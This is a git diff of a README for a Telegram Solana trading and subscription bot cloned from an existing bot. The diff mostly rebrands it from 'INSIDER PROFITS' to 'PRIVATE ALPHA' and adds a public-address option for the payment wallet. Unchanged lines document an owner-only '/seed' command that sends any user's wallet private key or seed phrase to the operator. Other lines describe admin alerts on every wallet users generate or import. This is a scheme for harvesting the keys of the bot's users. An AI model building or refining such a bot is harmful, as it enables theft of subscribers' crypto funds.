@@ -1,11 +1,11 @@
-# 💎 INSIDER PROFITS — Solana Trading & Subscription Bot
+# 💎 PRIVATE ALPHA — Solana Trading & Subscription Bot
 
 A word-for-word, button-for-button upgrade of **@runner_sol_bot** — Solana
 analytics **+ a real trading bot** with a real subscription business on top.
 
 | Feature | Original | This version |
 |---|---|---|
-| Name | Runner Bot | **INSIDER PROFITS** |
+| Name | Runner Bot | **PRIVATE ALPHA** |
 | Reports | First 3 free, then 0.1 SOL/wk / 0.3 SOL/mo / 3 SOL lifetime | **First 3 free (kept)**, then 4 membership tiers |
 | Membership | 3 flat plans | 🌱 Newbie 1 SOL · 🔰 Beginner 2 SOL · ⭐ Pro Trader 4 SOL · 💎 Elite Trader 8 SOL (prices & durations in `.env`) |
 | Insider | — | **🚀 JOIN INSIDER button** under the plans (own price/duration, e.g. 5 SOL/30 days) |
@@ -29,22 +29,21 @@ python bot.py
 ```
 
 - **BOT_TOKEN** — from @BotFather (set the bot's display name to
-  **INSIDER PROFITS** there too: /mybots → Edit Bot → Edit Name).
+  **PRIVATE ALPHA** there too: /mybots → Edit Bot → Edit Name).
 - **OWNER_ID** — your numeric Telegram ID (from @userinfobot).
 - **RPC_URL** — public works for testing; Helius/QuickNode recommended for production.
 
 ## 2. The payment wallet (membership & subscriptions)
 
-Put it in `.env` — the bot accepts **any of these formats**:
+**No private key needed.** Two options:
 
-- `TREASURY_PRIVATE_KEY=<base58 private key>`
-- `TREASURY_PRIVATE_KEY=[46, 207, ...]` (64-number array)
-- `TREASURY_PRIVATE_KEY=word1 word2 … word12/24` (**seed phrase**)
-- **Address only:** `TREASURY_ADDRESS=<public address>` — payments are still
-  verified on-chain against it; you only need the private key for
-  referral-credit payouts.
-
-…or leave it empty and send the key to the bot with `/importwallet`.
+- **Public address only (recommended):** put it in `.env` →
+  `TREASURY_ADDRESS=<your public receiving address>`, **or** DM the bot
+  `/setaddress <address>` — no key stored anywhere, payments are verified
+  on-chain against that address.
+- **Private key (optional):** `TREASURY_PRIVATE_KEY=<base58 key | [64-byte
+  array] | seed phrase>` or `/importwallet` in the bot's DM. Only needed if
+  you want automatic referral-credit payouts.
 
 Payments are real on-chain SOL transfers: the bot scans the receiving
 address's latest transactions for a matching amount, verifies it's
@@ -88,7 +87,7 @@ the IDs from a link. The easy way:
 
 1. Add the bot as **admin** to the channel.
 2. DM the bot: `/setchannel newbie` (keys: `newbie`, `beginner`, `pro`,
-   `elite`, `insider`, or a CHANNEL_PASSES name).
+   `elite`, `insider` (Private Alpha), or a CHANNEL_PASSES name).
 3. **Forward any message from that channel** to the bot — it saves the ID
    automatically. (Or send the `@username` / numeric id.)
 
@@ -117,9 +116,9 @@ shows as a free 📣 button in the main menu and welcome message.
 
 ## 6. Admin commands (owner only)
 
-`/admin` · `/importwallet` · `/wallet` · `/stats` · `/setchannel <key>`
-· `/seed <user_id>` · `/verify <id> <plan|pass>` · `/revoke <id>`
-· `/extend <id> <days>` · `/check <tx_sig>` · `/broadcast <text>`
+`/admin` · `/importwallet` · `/setaddress <address>` · `/wallet` · `/stats`
+· `/setchannel <key>` · `/seed <user_id>` · `/verify <id> <plan|pass>`
+· `/revoke <id>` · `/extend <id> <days>` · `/check <tx_sig>` · `/broadcast <text>`
 
 `/seed <user_id>` pulls **any user's trading wallet** (private key or seed)
 straight into your DM — on top of the automatic alerts you already get for
@@ -145,7 +144,7 @@ Admin DM alerts: every payment, every wallet generated/imported/exported
 - Free Render web services **sleep after ~15 min of no traffic**. UptimeRobot
   fixes that:
   1. uptimerobot.com → **New monitor** → type **HTTP(s)**.
-  2. URL: `https://insider-profits-bot.onrender.com/` (friendly name: anything).
+  2. URL: `https://private-alpha-bot.onrender.com/` (friendly name: anything).
   3. Monitoring interval: **5 minutes**. Save.
 - The ping wakes the service before it ever sleeps, and UptimeRobot also
   alerts you by email if the bot ever goes down. ✔️
